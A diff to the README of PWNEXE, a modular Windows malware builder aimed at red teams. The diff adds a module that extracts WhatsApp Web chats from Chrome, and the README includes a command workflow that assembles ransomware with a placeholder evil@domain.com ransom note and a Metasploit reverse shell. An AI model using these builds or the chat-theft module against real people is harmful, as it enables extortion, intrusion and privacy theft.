@@ -1,3 +1,13 @@
+## What's New
+
+### VERSION 0.1.1
+- **New Module: `daemon/chatwipe`** - WhatsApp chat extractor that automatically extracts the first 8 chats from a user's WhatsApp Web session in Google Chrome
+- **Features:**
+  - Automatically detects Chrome installation and WhatsApp Web login
+  - Extracts both incoming and outgoing messages with timestamps
+
+---
+
 ## Overview
 **PWNEXE** is a modular Windows malware generation framework. It empowers security researchers and red teamers to rapidly build custom malware payloads by chaining together a variety of modules—such as ransomware, persistence loaders, C2 servers, and more—into a single executable. PWNEXE is designed for advanced adversary simulation, malware research, and authorized red team operations.
 
@@ -27,12 +37,7 @@
    ```bash
    python3 --version
    ```
-3. **Install dependencies:**
-   ```bash
-   python3 -m pip install --upgrade pip
-   python3 -m pip install -r requirements.txt
-   ```
-4. **Install system dependencies:**
+3. **Install system dependencies:**
    - Go (for module compilation)
    - Rust (for in-memory loader)
    - **Docker** (required for payload obfuscation)
@@ -74,13 +79,13 @@ python3 main.py
 
 ### Example Workflow
 ```
-pwnexe > show modules
-pwnexe > use daemon/bartmoss
-pwnexe > set NOTE "Your files have been encrypted! Contact evil@domain.com."
-pwnexe > use daemon/spider
-pwnexe > set LHOST 192.168.1.10
-pwnexe > set LPORT 4444
-pwnexe > build
+> show modules
+> use daemon/bartmoss
+> set NOTE "Your files have been encrypted! Contact evil@domain.com."
+> use daemon/spider
+> set LHOST 192.168.1.10
+> set LPORT 4444
+> build
 ```
 - The final EXE will be saved in the `.LOOT` directory.
 
@@ -93,6 +98,7 @@ pwnexe > build
 | daemon/filedaemon        | Normal C2 server to receive data                                   |
 | daemon/spider            | Metasploit C2 server (reverse shell/payload delivery)              |
 | daemon/bartmoss          | Ransomware builder                                                 |
+| daemon/chatwipe          | WhatsApp chat extractor - gets first 8 chats from Chrome login    |
 | interfaceplug/blackout   | Screen blackout utility                                            |
 | interfaceplug/suicide    | Block input (DoS)                                                  |
 | quickhack/ping           | Sends back user info to the C2 server                              |
